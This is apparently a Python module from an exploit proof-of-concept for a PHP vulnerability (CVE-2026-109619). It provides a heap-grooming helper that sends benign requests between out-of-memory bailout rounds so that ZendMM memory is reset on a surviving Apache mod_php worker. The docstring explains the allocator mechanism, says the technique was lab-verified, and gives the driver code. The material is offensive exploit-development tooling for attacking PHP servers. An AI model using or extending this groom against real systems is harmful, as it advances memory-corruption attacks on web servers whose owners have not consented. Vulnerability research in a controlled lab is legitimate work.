#!/usr/bin/env python3 -I
# INDEX: reset zendmm real_size between groom rounds | apache fpm | worker survives oom bailout
"""Clean-request ZendMM real_size reset: interleave a benign request between OOM-bailout groom
rounds to defeat cross-round allocator churn on a worker that survives the bailout (CVE-2026-109619
seat research).

Mechanism (gdb-grounded, php:8.4.26-apache @32M): a groom round that OOM-bails (e.g.
groom.upload_progress_accumulate's parser-OOM-after-flush) leaves ZendMM real_size elevated on a
SURVIVING worker -- the released chunks aren't trimmed the way a clean request shutdown trims
them. Repeated bailouts churn real_size upward until an unrelated allocation (the next round's own
encode) trips memory_limit first, capping the groom well below the worker's true ceiling. A single
benign request between rounds runs a clean zend_mm_shutdown(full=0), trimming real_size back to
the main chunk -- this defeats the churn and lets the groom reach its real ceiling.

Apache-specific: FPM doesn't need this -- a worker that dies to the OOM (exit70) gets the same trim
for free on respawn. This primitive matters for any groom that must survive the bailout to
accumulate across rounds on one worker (Apache mod_php, or an FPM worker kept alive by a
non-fatal bailout).

API:
  reset(host, port, path="/pid.php", timeout=5.0) -> one benign GET (any non-OOM response).
  interleaved(round_fn, n, host, port, path="/pid.php", timeout=5.0) -> calls round_fn(i) for
    i in 1..n, issuing reset() after each; round_fn performs the groom round's own I/O. Returns
    the list of round_fn's return values.

Verified (poc/research/apache_accum_cap.py, php:8.4.26-apache @32M, lab/apsf --profile apsf32):
  groom.upload_progress_accumulate without this primitive plateaus ~2MB (flat from round 10); with
  it, growth stays linear past 6MB+ (round 30), worker alive throughout.
Stage: VERIFIED 8.4.26-apache.
"""
import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common import http_raw as H  # noqa: E402


def reset(host, port, path="/pid.php", timeout=5.0):
    """One benign request: its clean request shutdown trims ZendMM real_size, defeating the
    cross-round churn an OOM-bailout groom round leaves on a surviving worker."""
    return H.get(host, port, path, timeout=timeout)


def interleaved(round_fn, n, host, port, *, path="/pid.php", timeout=5.0):
    """Run round_fn(1..n), interleaving reset() after each -- the churn-defeating groom driver.
    round_fn(i) performs one groom round's own request(s)."""
    results = []
    for i in range(1, n + 1):
        results.append(round_fn(i))
        reset(host, port, path=path, timeout=timeout)
    return results
